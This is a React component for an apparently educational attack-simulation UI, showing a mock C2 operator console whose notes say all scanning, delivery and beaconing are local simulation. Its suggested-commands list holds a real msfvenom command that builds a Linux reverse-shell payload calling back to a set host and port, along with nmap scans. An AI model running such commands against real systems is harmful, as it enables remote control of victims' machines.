import FakeTerminal from "./FakeTerminal";
import NetworkPath from "./NetworkPath";
import {
  PacketStage,
  RouteMode,
  TargetProfile,
  TerminalEntry,
  TransferDirection,
} from "../types";

interface AttackerPanelProps {
  c2Ip: string;
  relayIp: string;
  targetProfile: TargetProfile;
  routeMode: RouteMode;
  packetStage: PacketStage;
  packetVisible: boolean;
  transferDirection: TransferDirection;
  terminalLines: TerminalEntry[];
  onCommand: (command: string) => void;
  payloadName: string | null;
  beaconEnabled: boolean;
  beaconCount: number;
}

const suggestedCommands = [
  "help",
  "show ips",
  "show route",
  "show beacon",
  "nmap 203.0.113.25",
  "nmap -sV 203.0.113.25",
  "route use relay",
  "route use direct",
  "build package safe",
  `msfvenom -p linux/x86/shell_reverse_tcp LHOST=172.20.44.9 LPORT=443 -b "\\x00\\x0a\\x0d" -f python`,
  "cat exploit.py",
  "python3 exploit.py",
  "send package",
  "beacon start",
  "beacon stop",
  "Proxy Chains"
];

export default function AttackerPanel({
  c2Ip,
  relayIp,
  targetProfile,
  routeMode,
  packetStage,
  packetVisible,
  transferDirection,
  terminalLines,
  onCommand,
  payloadName,
  beaconEnabled,
  beaconCount,
}: AttackerPanelProps) {
  return (
    <section className="panel attacker-panel">
      <div className="panel-header">
        <div>
          <p className="eyebrow">LEFT PANEL</p>
          <h2 className="panel-title">C2 / Operator Console</h2>
        </div>
        <span className="panel-badge">Interactive Mock</span>
      </div>

      <div className="panel-card">
        <h3 className="card-title">Session Overview</h3>
        <div className="stats-grid">
          <div className="stat-card">
            <span className="stat-label">C2 IP</span>
            <strong>{c2Ip}</strong>
          </div>
          <div className="stat-card">
            <span className="stat-label">Relay IP</span>
            <strong>{relayIp}</strong>
          </div>
          <div className="stat-card">
            <span className="stat-label">Target</span>
            <strong>{targetProfile.hostname}</strong>
          </div>
          <div className="stat-card">
            <span className="stat-label">Staged Package</span>
            <strong>{payloadName ?? "none"}</strong>
          </div>
          <div className="stat-card">
            <span className="stat-label">Beacon Status</span>
            <strong>{beaconEnabled ? "armed" : "disabled"}</strong>
          </div>
          <div className="stat-card">
            <span className="stat-label">Beacon Count</span>
            <strong>{beaconCount}</strong>
          </div>
        </div>
      </div>

      <div className="panel-card">
        <h3 className="card-title">Transfer Path</h3>
        <NetworkPath
          c2Ip={c2Ip}
          relayIp={relayIp}
          targetIp={targetProfile.ip}
          routeMode={routeMode}
          packetStage={packetStage}
          packetVisible={packetVisible}
          transferDirection={transferDirection}
        />
      </div>

      <div className="panel-card">
        <h3 className="card-title">Operator Terminal</h3>
        <FakeTerminal
          lines={terminalLines}
          onCommand={onCommand}
          suggestedCommands={suggestedCommands}
        />
      </div>

      <div className="panel-card">
        <h3 className="card-title">Scenario Notes</h3>
        <ul className="note-list">
          <li>All recon, delivery, and beacon behavior is local UI simulation only.</li>
          <li>No real scanning, proxying, callback traffic, or remote control occurs.</li>
          <li>The route view flips direction during simulated callback events.</li>
        </ul>
      </div>
    </section>
  );
}